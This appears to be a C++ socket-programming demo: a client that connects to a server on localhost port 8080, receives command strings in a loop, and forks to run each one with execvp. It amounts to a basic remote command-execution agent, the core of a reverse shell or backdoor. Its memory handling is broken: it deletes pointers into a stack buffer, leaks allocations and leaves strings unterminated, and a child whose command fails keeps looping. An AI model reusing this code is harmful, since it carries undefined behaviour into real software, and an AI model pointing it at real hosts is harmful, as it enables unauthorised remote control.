// Client side C/C++ program to demonstrate Socket
// programming
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <iostream>

#define PORT 8080

int main(int argc, char const* argv[])
{
	int status, valread, client_fd;
	struct sockaddr_in serv_addr;
	
	
    char command_copy[1024] = { 0 }; // for keeping a copy of the command
	if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		printf("\n Socket creation error \n");
		return -1;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(PORT);

	// Convert IPv4 and IPv6 addresses from text to binary
	// form
	if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)
		<= 0) {
		printf(
			"\nInvalid address/ Address not supported \n");
		return -1;
	}

	if ((status
		= connect(client_fd, (struct sockaddr*)&serv_addr,
				sizeof(serv_addr)))
		< 0) {
		printf("\nConnection Failed \n");
		return -1;
	}

    std::cout << "[+]connection established\n";

    while(true) {

        char *command; // buffer for storing the command from the server
        command = new char[1024]; // allocating memory 
        
        valread = read(client_fd, command, 1024);
        printf("[+]%s\n", command);

        

        //std::cout << "size is: " << siz << std::endl ;

        //std::cout << args[0] << "\n";
        
        /* here we are forking the a child process to run the command otherwise 
         the execvp function will terminate the while loop as the program will be taken over by the command we run using execvp*/

        int p = fork();
        if (p == 0) {
            //storing a copy of the command

            strcpy(command_copy, command);
            // for storing the command name and it's params
            char **args = nullptr; 

            // tokenizing the string 
            // suppose we have "ls -la"


            // now it will split it to "ls, -la"
            char *token = strtok(command, " ");

            // we are also tracking the size
            int size = 0;
            while (token) {
                ++size;
                token = strtok(nullptr, " ");
            }
            
            
            args = new char*[size + 1]; // extra space for storing the null ptr

            //0,1,2

            token = strtok(command_copy, " "); //ls -la

            for (int iter = 0; iter < size; iter++) { 
                args[iter] = new char(strlen(token)); //args[1] = new char(strlen("-la"))
                args[iter] = token; //args[1] = "-la"
                token = strtok(nullptr, " "); 
            }

            // at the end the split array must contain a nullptr/NULL at the end such as "{ ls, -la, nullptr }"
            args[size] = nullptr; 

            // args: to point char pointers in turn points to the char arrays

            int ret = execvp(args[0], args); //execvp("ls", NULL) 

            if (ret == -1) {
                std::cout << "unable to run the command! \n";
            }

            // we are again resetting the "args" variable for the new tokens
            for (int iter = 0; iter <= size + 1; iter++) {
                delete(args[iter]); 
            } 

            delete(args);
            args = nullptr;

        } else {
            continue;
        }
    }

	// closing the connected socket
	close(client_fd);
	return 0;
}
